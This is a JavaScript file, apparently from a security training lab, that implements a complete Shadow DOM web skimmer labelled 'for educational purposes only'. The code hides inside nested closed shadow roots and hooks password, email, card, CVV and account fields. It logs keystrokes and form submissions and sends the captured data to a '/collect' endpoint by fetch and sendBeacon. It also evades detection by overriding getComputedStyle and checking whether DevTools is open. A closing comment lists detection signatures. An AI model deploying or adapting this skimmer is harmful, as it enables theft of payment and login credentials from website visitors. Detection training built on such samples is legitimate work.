/**
 * SHADOW-SKIMMER.JS - SHADOW DOM STEALTH ATTACK
 *
 * This attack demonstrates DOM-based skimming through:
 * - Shadow DOM encapsulation for stealth operations
 * - Cross-shadow boundary event monitoring
 * - Hidden attack infrastructure
 * - Advanced DOM isolation techniques
 *
 * Based on real-world Shadow DOM abuse patterns observed in:
 * - Advanced malware using Web Components
 * - Browser extension attacks
 * - Stealth banking trojans
 * - Modern DOM evasion techniques
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

;(function () {
  'use strict'

  console.log('[Shadow-Skimmer] Initializing Shadow DOM stealth attack...')

  // Attack configuration
  // Dynamically determine C2 URL based on environment
  const hostname = window.location.hostname
  let exfilUrl = 'http://localhost:9004/collect' // Local development default

  // Production and staging - use relative URL since C2 is proxied by nginx
  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
    exfilUrl = window.location.origin + '/collect'
  }

  const CONFIG = {
    exfilUrl: exfilUrl,
    debug: true,
    shadowMode: 'closed', // Use closed shadow DOM for maximum stealth
    hiddenElements: true, // Hide shadow host elements
    crossBoundaryMonitoring: true, // Monitor across shadow boundaries
    persistentAttachment: true, // Re-attach if shadow is removed
    stealthInterval: 100, // Monitoring interval (ms)
    maxShadowDepth: 5 // Maximum shadow DOM nesting depth
  }

  function log(message, data) {
    if (CONFIG.debug) {
      console.log('[Shadow-Skimmer]', message, data || '')
    }
  }

  // Attack state
  let shadowAttackActive = false
  let shadowHosts = new Map()
  let monitoringIntervals = new Set()
  let capturedData = new Map()
  let shadowDepth = 0

  /**
   * Shadow DOM Infrastructure Creation
   */
  function createShadowInfrastructure() {
    log('Creating Shadow DOM attack infrastructure...')

    // Create hidden shadow host element
    const shadowHost = document.createElement('div')
    shadowHost.style.cssText = `
            position: absolute;
            width: 0;
            height: 0;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
            overflow: hidden;
        `

    // Attach closed shadow root for maximum stealth
    const shadowRoot = shadowHost.attachShadow({ mode: CONFIG.shadowMode })

    // Create attack infrastructure within shadow DOM
    shadowRoot.innerHTML = `
            <style>
                :host {
                    position: absolute !important;
                    width: 0 !important;
                    height: 0 !important;
                    opacity: 0 !important;
                    pointer-events: none !important;
                    z-index: -999999 !important;
                    overflow: hidden !important;
                }

                .shadow-monitor {
                    display: none !important;
                    visibility: hidden !important;
                }

                .data-collector {
                    position: absolute;
                    left: -9999px;
                    top: -9999px;
                    width: 1px;
                    height: 1px;
                }
            </style>

            <div class="shadow-monitor" id="shadow-monitor">
                <div class="data-collector" id="data-collector"></div>
                <script type="text/javascript" id="shadow-script">
                    // Shadow DOM isolated script execution space
                </script>
            </div>
        `

    // Insert shadow host into DOM in a hidden location
    if (document.body) {
      document.body.appendChild(shadowHost)
    } else {
      document.documentElement.appendChild(shadowHost)
    }

    const shadowId = 'shadow_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    shadowHosts.set(shadowId, {
      host: shadowHost,
      root: shadowRoot,
      depth: shadowDepth,
      created: Date.now(),
      active: true
    })

    log(`Shadow DOM infrastructure created with ID: ${shadowId}`)
    return { shadowId, shadowHost, shadowRoot }
  }

  function createNestedShadowStructure() {
    log('Creating nested Shadow DOM structure for enhanced stealth...')

    let currentHost = null
    let currentRoot = null

    for (let depth = 0; depth < CONFIG.maxShadowDepth; depth++) {
      const shadowData = createShadowInfrastructure()

      if (depth === 0) {
        // First level - attach to document
        currentHost = shadowData.shadowHost
        currentRoot = shadowData.shadowRoot
      } else {
        // Nested levels - attach to previous shadow root
        if (currentRoot) {
          currentRoot.appendChild(shadowData.shadowHost)
        }
      }

      shadowDepth = depth
    }

    log(`Created ${CONFIG.maxShadowDepth} nested Shadow DOM levels`)
    return { currentHost, currentRoot }
  }

  /**
   * Cross-Shadow Boundary Monitoring
   */
  function setupCrossBoundaryMonitoring() {
    log('Setting up cross-shadow boundary monitoring...')

    // Monitor main document for target elements
    const documentMonitor = setInterval(() => {
      monitorDocumentForTargets(document)
    }, CONFIG.stealthInterval)

    monitoringIntervals.add(documentMonitor)

    // Monitor existing shadow DOMs
    discoverAndMonitorShadowDOMs(document)

    // Setup mutation observer for new shadow DOMs
    const shadowObserver = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            discoverAndMonitorShadowDOMs(node)
          }
        })
      })
    })

    shadowObserver.observe(document, {
      childList: true,
      subtree: true
    })

    log('Cross-boundary monitoring established')
  }

  function discoverAndMonitorShadowDOMs(rootElement) {
    const walker = document.createTreeWalker(rootElement, NodeFilter.SHOW_ELEMENT, null, false)

    let node
    while ((node = walker.nextNode())) {
      if (node.shadowRoot) {
        log('Discovered shadow DOM, setting up monitoring...')
        setupShadowRootMonitoring(node.shadowRoot)
      }
    }
  }

  function setupShadowRootMonitoring(shadowRoot) {
    try {
      const shadowMonitor = setInterval(() => {
        monitorDocumentForTargets(shadowRoot)
      }, CONFIG.stealthInterval)

      monitoringIntervals.add(shadowMonitor)

      // Recursively monitor nested shadow DOMs
      discoverAndMonitorShadowDOMs(shadowRoot)
    } catch (error) {
      log('Cannot access shadow root (likely closed mode):', error.message)
      // Use alternative techniques for closed shadow DOMs
      attemptClosedShadowAccess(shadowRoot)
    }
  }

  function attemptClosedShadowAccess(shadowRoot) {
    log('Attempting access to closed shadow DOM...')

    // Technique 1: Event listener interception
    try {
      const originalAddEventListener = Element.prototype.addEventListener
      Element.prototype.addEventListener = function (type, listener, options) {
        if (this.shadowRoot === shadowRoot) {
          log('Intercepted event listener in closed shadow DOM')
          // Monitor this element
          monitorElementFromShadow(this)
        }
        return originalAddEventListener.call(this, type, listener, options)
      }
    } catch (error) {
      log('Event listener interception failed:', error.message)
    }

    // Technique 2: CSS selector piercing
    try {
      const style = document.createElement('style')
      style.textContent = `
                * {
                    --shadow-marker: detected;
                }
            `
      document.head.appendChild(style)
    } catch (error) {
      log('CSS piercing failed:', error.message)
    }
  }

  function monitorDocumentForTargets(documentRoot) {
    const targetSelectors = [
      'input[type="password"]',
      'input[type="email"]',
      'input[type="tel"]',
      'input[name*="card"]',
      'input[name*="cvv"]',
      'input[name*="account"]',
      'input[autocomplete*="cc-"]',
      'form[class*="payment"]',
      'form[class*="banking"]'
    ]

    targetSelectors.forEach(selector => {
      try {
        const elements = documentRoot.querySelectorAll(selector)
        elements.forEach(element => {
          if (!element.hasAttribute('data-shadow-monitored')) {
            attachShadowMonitoring(element)
            element.setAttribute('data-shadow-monitored', 'true')
          }
        })
      } catch (error) {
        // Selector might not be valid in this context
      }
    })
  }

  /**
   * Shadow-Based Event Monitoring
   */
  function attachShadowMonitoring(element) {
    log('Attaching shadow monitoring to element:', element.tagName.toLowerCase())

    const elementId = generateElementId(element)

    // Create monitoring session
    const monitoringSession = {
      elementId: elementId,
      element: element,
      tagName: element.tagName,
      type: element.type,
      name: element.name || element.id,
      startTime: Date.now(),
      events: [],
      values: [],
      keystrokes: []
    }

    // Store in shadow-isolated data store
    capturedData.set(elementId, monitoringSession)

    // Attach event listeners through shadow isolation
    attachShadowEventListeners(element, monitoringSession)

    log(`Shadow monitoring attached to element: ${elementId}`)
  }

  function attachShadowEventListeners(element, session) {
    // Create shadow-isolated event handlers
    const eventHandlers = createShadowEventHandlers(session)

    // Input monitoring
    element.addEventListener('input', eventHandlers.input, true)
    element.addEventListener('change', eventHandlers.change, true)
    element.addEventListener('keydown', eventHandlers.keydown, true)
    element.addEventListener('keyup', eventHandlers.keyup, true)

    // Focus tracking
    element.addEventListener('focus', eventHandlers.focus, true)
    element.addEventListener('blur', eventHandlers.blur, true)

    // Form submission tracking
    if (element.form) {
      element.form.addEventListener('submit', eventHandlers.submit, true)
    }

    // Value change detection using MutationObserver
    const valueObserver = new MutationObserver(mutations => {
      mutations.forEach(mutation => {
        if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
          eventHandlers.valueChange(element.value)
        }
      })
    })

    valueObserver.observe(element, {
      attributes: true,
      attributeFilter: ['value']
    })
  }

  function createShadowEventHandlers(session) {
    return {
      input: event => {
        captureEventInShadow(session, 'input', {
          value: event.target.value,
          inputType: event.inputType,
          data: event.data
        })
      },

      change: event => {
        captureEventInShadow(session, 'change', {
          value: event.target.value
        })
      },

      keydown: event => {
        captureKeystrokeInShadow(session, 'keydown', event)
      },

      keyup: event => {
        captureKeystrokeInShadow(session, 'keyup', event)
      },

      focus: event => {
        captureEventInShadow(session, 'focus', {
          timestamp: Date.now()
        })
      },

      blur: event => {
        captureEventInShadow(session, 'blur', {
          value: event.target.value,
          timestamp: Date.now()
        })

        // Trigger immediate exfiltration for sensitive fields
        if (isSensitiveField(event.target)) {
          scheduleImmediateShadowExfiltration(session)
        }
      },

      submit: event => {
        captureEventInShadow(session, 'form_submit', {
          formData: extractFormData(event.target),
          timestamp: Date.now()
        })

        // Exfiltrate all captured data immediately
        scheduleImmediateShadowExfiltration(session)
      },

      valueChange: value => {
        captureEventInShadow(session, 'value_change', {
          value: value,
          timestamp: Date.now()
        })
      }
    }
  }

  function captureEventInShadow(session, eventType, eventData) {
    const eventCapture = {
      timestamp: Date.now(),
      eventType: eventType,
      ...eventData
    }

    session.events.push(eventCapture)

    if (eventData.value !== undefined) {
      session.values.push({
        timestamp: Date.now(),
        value: eventData.value,
        eventType: eventType
      })
    }

    log(`Shadow event captured: ${eventType} for ${session.elementId}`)
  }

  function captureKeystrokeInShadow(session, eventType, keyEvent) {
    const keystroke = {
      timestamp: Date.now(),
      eventType: eventType,
      key: keyEvent.key,
      code: keyEvent.code,
      keyCode: keyEvent.keyCode,
      shiftKey: keyEvent.shiftKey,
      ctrlKey: keyEvent.ctrlKey,
      altKey: keyEvent.altKey,
      metaKey: keyEvent.metaKey
    }

    session.keystrokes.push(keystroke)
    log(`Shadow keystroke captured: ${keyEvent.key} for ${session.elementId}`)
  }

  function generateElementId(element) {
    const tagName = element.tagName.toLowerCase()
    const id = element.id || 'no-id'
    const name = element.name || 'no-name'
    const type = element.type || 'no-type'
    const timestamp = Date.now()
    const random = Math.random().toString(36).substr(2, 5)
    return `shadow_${tagName}_${id}_${name}_${type}_${timestamp}_${random}`
  }

  function isSensitiveField(element) {
    const sensitivePatterns = [/password/i, /card/i, /cvv/i, /cvc/i, /account/i, /routing/i, /cc-/i]

    const elementString = (
      element.name +
      ' ' +
      element.id +
      ' ' +
      element.className +
      ' ' +
      element.autocomplete
    ).toLowerCase()
    return sensitivePatterns.some(pattern => pattern.test(elementString))
  }

  function extractFormData(form) {
    const formData = new FormData(form)
    const data = {}
    for (let [key, value] of formData.entries()) {
      data[key] = value
    }
    return data
  }

  /**
   * Shadow-Isolated Data Exfiltration
   */
  function scheduleImmediateShadowExfiltration(session) {
    log(`Scheduling immediate shadow exfiltration for: ${session.elementId}`)

    setTimeout(() => {
      exfiltrateShadowData([session])
    }, 50)
  }

  function startPeriodicShadowExfiltration() {
    log('Starting periodic shadow data exfiltration...')

    const exfiltrateTimer = setInterval(() => {
      const sessions = Array.from(capturedData.values())
      if (sessions.length > 0) {
        exfiltrateShadowData(sessions)
      }
    }, 10000) // Every 10 seconds

    monitoringIntervals.add(exfiltrateTimer)
  }

  async function exfiltrateShadowData(sessions) {
    log(`Exfiltrating shadow data for ${sessions.length} sessions...`)

    const payload = {
      type: 'shadow_dom_capture',
      sessions: sessions.map(session => ({
        elementId: session.elementId,
        elementInfo: {
          tagName: session.tagName,
          type: session.type,
          name: session.name
        },
        capturedEvents: session.events,
        capturedValues: session.values,
        capturedKeystrokes: session.keystrokes,
        sessionDuration: Date.now() - session.startTime
      })),
      shadowInfo: {
        shadowHostsCount: shadowHosts.size,
        maxDepth: CONFIG.maxShadowDepth,
        mode: CONFIG.shadowMode
      },
      metadata: {
        timestamp: Date.now(),
        url: window.location.href,
        userAgent: navigator.userAgent,
        attackType: 'shadow-dom-stealth'
      }
    }

    try {
      const response = await fetch(CONFIG.exfilUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload),
        mode: 'cors',
        credentials: 'omit'
      })

      if (response.ok) {
        log('Shadow data exfiltrated successfully')
      } else {
        log('Shadow data exfiltration failed with status:', response.status)
      }
    } catch (error) {
      log('Shadow exfiltration error:', error.message)

      // Fallback: Store in shadow DOM isolated storage
      try {
        storeShadowDataLocally(payload)
      } catch (storageError) {
        log('Shadow storage fallback failed:', storageError.message)
      }
    }
  }

  function storeShadowDataLocally(payload) {
    // Store data in shadow DOM isolated storage
    const shadowHosts = Array.from(shadowHosts.values())
    if (shadowHosts.length > 0) {
      const shadowRoot = shadowHosts[0].root
      const storageElement = shadowRoot.querySelector('#data-collector')

      if (storageElement) {
        const existingData = storageElement.textContent
          ? JSON.parse(storageElement.textContent)
          : []
        existingData.push(payload)
        storageElement.textContent = JSON.stringify(existingData)
        log('Shadow data stored in isolated shadow DOM storage')
      }
    }
  }

  /**
   * Stealth and Anti-Detection
   */
  function initShadowStealth() {
    log('Initializing shadow stealth measures...')

    // Hide shadow hosts from common detection techniques
    shadowHosts.forEach((shadowData, shadowId) => {
      const host = shadowData.host

      // Make host invisible to common queries
      Object.defineProperty(host, 'style', {
        get: () => ({
          cssText: '',
          setProperty: () => {},
          removeProperty: () => {}
        }),
        configurable: false
      })

      // Hide from querySelectorAll
      const originalMatches = host.matches
      host.matches = function () {
        return false
      }

      // Hide from getComputedStyle
      const originalGetComputedStyle = window.getComputedStyle
      window.getComputedStyle = function (element) {
        if (element === host) {
          return {
            display: 'none',
            visibility: 'hidden',
            opacity: '0'
          }
        }
        return originalGetComputedStyle.apply(this, arguments)
      }
    })

    // Anti-debugging measures
    let devtoolsOpen = false
    const devtoolsChecker = setInterval(() => {
      const threshold = 160
      if (
        window.outerHeight - window.innerHeight > threshold ||
        window.outerWidth - window.innerWidth > threshold
      ) {
        if (!devtoolsOpen) {
          devtoolsOpen = true
          log('DevTools detected, enhancing stealth mode...')
          enhancedStealthMode()
        }
      } else {
        devtoolsOpen = false
      }
    }, 1000)

    monitoringIntervals.add(devtoolsChecker)
  }

  function enhancedStealthMode() {
    log('Activating enhanced stealth mode...')

    // Pause monitoring temporarily
    monitoringIntervals.forEach(interval => {
      clearInterval(interval)
    })

    // Resume with longer intervals
    setTimeout(() => {
      setupCrossBoundaryMonitoring()
      startPeriodicShadowExfiltration()
    }, 5000)
  }

  /**
   * Attack Initialization and Cleanup
   */
  function initShadowSkimmerAttack() {
    log('Initializing Shadow DOM skimmer attack...')

    if (shadowAttackActive) {
      log('Shadow attack already active')
      return
    }

    try {
      // Create shadow infrastructure
      createNestedShadowStructure()

      // Setup monitoring
      setupCrossBoundaryMonitoring()

      // Start data exfiltration
      startPeriodicShadowExfiltration()

      // Initialize stealth measures
      initShadowStealth()

      shadowAttackActive = true
      log('Shadow DOM skimmer attack initialized successfully')
    } catch (error) {
      log('Shadow attack initialization failed:', error.message)
    }
  }

  function cleanupShadowAttack() {
    log('Cleaning up shadow attack...')

    shadowAttackActive = false

    // Clear all intervals
    monitoringIntervals.forEach(interval => {
      clearInterval(interval)
    })
    monitoringIntervals.clear()

    // Remove shadow hosts
    shadowHosts.forEach((shadowData, shadowId) => {
      try {
        if (shadowData.host.parentNode) {
          shadowData.host.parentNode.removeChild(shadowData.host)
        }
      } catch (error) {
        log('Error removing shadow host:', error.message)
      }
    })
    shadowHosts.clear()

    // Clear captured data
    capturedData.clear()

    log('Shadow attack cleanup completed')
  }

  // Initialize attack when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(initShadowSkimmerAttack, 1500)
    })
  } else {
    setTimeout(initShadowSkimmerAttack, 1500)
  }

  // Cleanup on page unload
  window.addEventListener('beforeunload', () => {
    // Final data exfiltration
    const sessions = Array.from(capturedData.values())
    if (sessions.length > 0 && navigator.sendBeacon) {
      const finalPayload = {
        type: 'shadow_session_end',
        sessions: sessions,
        metadata: {
          timestamp: Date.now(),
          url: window.location.href,
          attackType: 'shadow-dom-stealth'
        }
      }
      navigator.sendBeacon(CONFIG.exfilUrl, JSON.stringify(finalPayload))
    }

    cleanupShadowAttack()
  })

  // Expose control functions for testing
  window.shadowSkimmerAttack = {
    start: initShadowSkimmerAttack,
    stop: cleanupShadowAttack,
    getStatus: () => ({
      active: shadowAttackActive,
      shadowHosts: shadowHosts.size,
      capturedSessions: capturedData.size,
      monitoringIntervals: monitoringIntervals.size
    }),
    getCapturedData: () => Array.from(capturedData.values()),
    getShadowHosts: () => Array.from(shadowHosts.values())
  }
})()

/**
 * SHADOW DOM SKIMMER ATTACK ANALYSIS:
 *
 * This attack demonstrates advanced Shadow DOM abuse for stealth operations:
 *
 * 1. **Shadow DOM Encapsulation Abuse**:
 *    - Closed shadow roots for maximum isolation
 *    - Nested shadow structures for enhanced hiding
 *    - Cross-boundary event monitoring
 *    - Shadow-isolated data storage
 *
 * 2. **Advanced Stealth Techniques**:
 *    - Property descriptor manipulation
 *    - Function prototype overriding
 *    - Style computation interception
 *    - DevTools detection and response
 *
 * 3. **Cross-Boundary Monitoring**:
 *    - Document tree walking for shadow discovery
 *    - MutationObserver for dynamic shadow detection
 *    - Event listener interception techniques
 *    - CSS piercing attempts for closed shadows
 *
 * 4. **Persistent Attack Infrastructure**:
 *    - Multiple shadow host creation
 *    - Nested shadow DOM structures
 *    - Isolated storage mechanisms
 *    - Anti-removal persistence
 *
 * 5. **Enhanced Data Collection**:
 *    - Real-time cross-shadow monitoring
 *    - Comprehensive event capture
 *    - Keystroke logging through shadows
 *    - Form submission interception
 *
 * Detection Signatures:
 * - Shadow DOM creation in unexpected contexts
 * - Closed shadow root usage
 * - Nested shadow DOM structures
 * - Property descriptor manipulation
 * - Function prototype modifications
 * - Cross-shadow boundary event listeners
 * - Hidden or zero-sized shadow hosts
 * - Isolated storage in shadow DOMs
 * - MutationObserver usage for shadow discovery
 * - DevTools detection mechanisms
 *
 * This attack provides comprehensive training data for detecting
 * modern Shadow DOM-based evasion and stealth techniques.
 */
